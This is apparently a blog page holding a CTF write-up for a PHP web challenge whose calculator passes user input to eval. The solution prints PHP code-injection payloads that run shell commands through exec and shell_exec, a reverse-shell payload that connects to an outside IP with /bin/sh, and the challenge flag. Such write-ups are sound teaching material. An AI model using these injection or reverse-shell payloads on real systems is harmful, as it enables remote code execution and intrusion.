@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Writeup</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    <link rel="stylesheet" href="/style.css"/>
+    
+  </head>
+     
+  <body>
+    <!--Navigation Bar-->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+      <a class="navbar-brand" href="/index.html">Hackin7</a>
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarText">
+        <ul class="navbar-nav mr-auto">
+
+          <li class="nav-item active">
+            <a class="nav-link" href="/about.html">About</a>
+          </li>
+          
+        </ul>
+      </div>
+    </nav>
+    
+    <div>
+    <link href='/github-markdown-css/github-css.css' rel='stylesheet' type='text/css'><div class='github_markdown' style='width:80wh;'><div><a href='https://github.com/Hackin7/Programming-Crappy-Solutions/blob/master/Cyber Security/Capture the Flag Competitions/2021/Sieberrsec CTF 2.0/Training/Calculator Evaluation/README.md'>Original Github Link</a></div><h1>Calculator Evaluation</h1>
+<p>Web, 50</p>
+<h3>Description</h3>
+<p>Apparently my friend had just started learning PHP recently, and he has created a calculator app!
+Honestly, I'm not even sure whether it fits the name of being a calculator, given that it only adds the number 12 to any input.</p>
+<p>You can check out the site where he's hosting the calculator app <a href="http://challs.sieberrsec.tech:4587/calcv1.html">here</a>.</p>
+<p>Original Challenge Author: xzy_10</p>
+<h2>Solution</h2>
+<h3>Basic Inspection</h3>
+<p>Viewing the page source of the webpage gives me this</p>
+<pre><code>
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+	&lt;/head&gt;
+	&lt;body&gt;
+
+		&lt;h1&gt;Calculator App V1!&lt;/h1&gt;
+		&lt;h2&gt;Limited functionality for now... But I will add more in the future!&lt;/h2&gt;
+
+		&lt;form action=&quot;calcv1.php&quot; method=&quot;get&quot;&gt;
+			Number to be added: &lt;input type=&quot;text&quot; name=&quot;value&quot;&gt;&lt;br&gt;
+		&lt;input type=&quot;submit&quot; value=&quot;Add!&quot; class=&quot;button&quot;&gt;
+		&lt;/form&gt;
+		
+		&lt;h2&gt;Check out my code! Go to this &lt;a href = &quot;/calcv1.php.txt&quot;&gt;link!&lt;/a&gt;&lt;/h2&gt;
+		&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3>Testing Injection</h3>
+<p>I looked up the php code since they gave us access to it.</p>
+<pre><code>&lt;?php
+//Marvel at its sheer brilliance!
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+
+if(isset($_GET[&quot;value&quot;])){
+	eval(&quot;\$sum = 12+&quot;.$_GET[&quot;value&quot;].&quot;;&quot;);
+	echo &quot;&lt;h2&gt;&quot;.$sum.&quot;&lt;/h2&gt;&quot;;
+}
+else
+{
+	echo(&quot;&lt;h3&gt;Put something in! God damn it this is supposed to be trivial!&lt;/h3&gt;&quot;);
+}
+?&gt;
+</code></pre>
+<p>When I noticed an eval statement, you know that you can do an injection or something similar with the input field they give you.</p>
+<p>Putting in <code>12; $sum = 'shit';</code> and submitting you get</p>
+<pre><code>Your calculated answer is: shit
+</code></pre>
+<h3>Researching more on PHP injections</h3>
+<p>By googling &quot;PHP injection eval&quot; and also googling what functions allow you to execute commands, I realised that the <code>exec</code> command may be useful</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0; $sum = exec('echo test');</code></td>
+<td><code>Your calculated answer is: test</code></td>
+</tr>
+<tr>
+<td><code>0; $sum = exec('ls');</code></td>
+<td><code>Your calculated answer is: styles.css</code></td>
+</tr>
+<tr>
+<td><code>0; $sum = exec('pwd');</code></td>
+<td><code>Error!</code></td>
+</tr>
+<tr>
+<td><code>0; $sum = exec('ls /bin');</code></td>
+<td><code>Your calculated answer is: znew</code></td>
+</tr>
+<tr>
+<td><code>0; $sum = exec('ls /');</code></td>
+<td><code>Your calculated answer is: var</code></td>
+</tr>
+<tr>
+<td><code>0; $sum = exec('python -c &quot;print(1) &quot; ');</code></td>
+<td><code>Your calculated answer is:</code></td>
+</tr>
+</tbody>
+</table>
+<p>After a while I realised there is a better way to retrieve the output of the commands, because maybe they kept being cut off. A better payload to use is 0; <code>0; exec('ls ', $sum); $sum = implode(&quot;\n&quot;, $sum);</code></p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Output</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0; exec('cat styles.css', $sum); $sum = implode($sum);</code></td>
+<td><code>Your calculated answer is: @import url('https://fonts.googleapis.com/css2?family=Hind:wght@500;600&amp;display=swap');h1 { font-family: 'Hind', sans-serif;}h2 { font-family: 'Hind', sans-serif;}h3 { font-family: 'Hind', sans-serif;}h4 { font-family: 'Hind', sans-serif;}h5 { font-family: 'Hind', sans-serif;}h6 { font-family: 'Hind', sans-serif;}form { font-family: 'Hind', sans-serif; font-size: 20px;}input { font-family: 'Hind', sans-serif; font-size: 20px;}.button { font-family: 'Hind', sans-serif; font-size: 20px; color: white; background-color: #0ecf9f;}</code></td>
+</tr>
+<tr>
+<td><code>0; exec('ls', $sum); $sum = implode($sum);</code></td>
+<td><code>Your calculated answer is: calcv1.htmlcalcv1.phpcalcv1.php.txtstyles.css</code></td>
+</tr>
+<tr>
+<td><code>0; exec('ls ../', $sum); $sum = implode($sum);</code></td>
+<td><code>Your calculated answer is: calc-evalflag</code></td>
+</tr>
+</tbody>
+</table>
+<p>Ok I have enough tinkering around with the tiny box, I want to get a proper shell.</p>
+<p>I found a payload online <a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">here</a></p>
+<p>Putting in just <code>0; $sock=fsockopen(&quot;10.0.0.123&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);</code> makes the webpage take a while to load. It returns</p>
+<pre><code>Warning: fsockopen(): unable to connect to 10.0.0.123:1111 (Connection timed out) in /usr/src/calc-eval/calcv1.php(24) : eval()'d code on line 1
+Your calculated answer is: 12
+</code></pre>
+<p>Using <a href="https://www.whatismyip.com/">https://www.whatismyip.com/</a> to get my external IP address and using that address to connect to my PC doesn't seem like it works too. I think this is due to my router's firewall settings</p>
+<h3>Final Solution</h3>
+<p>In the end I coded a python program to interact with the thing to make life easier. I also realised that <code>shell_exec</code> is a better function to use. Using my python program and probing around , I get the answer</p>
+<pre><code>&gt; ls ../../
+bin
+games
+include
+lib
+lib32
+lib64
+libx32
+local
+sbin
+share
+src
+
+&gt; ls ../
+calc-eval
+flag
+
+&gt; cat ../flag
+IRS{pHp_eVAl_1s_ev1l_1f_y0u_d0nt_san1t1se_y0ur_1npUt5!}
+</code></pre>
+<h2>Flag</h2>
+<p><code>IRS{pHp_eVAl_1s_ev1l_1f_y0u_d0nt_san1t1se_y0ur_1npUt5!}</code></p>
+</div>
+    </div>
+    
+  </body>
+</html>
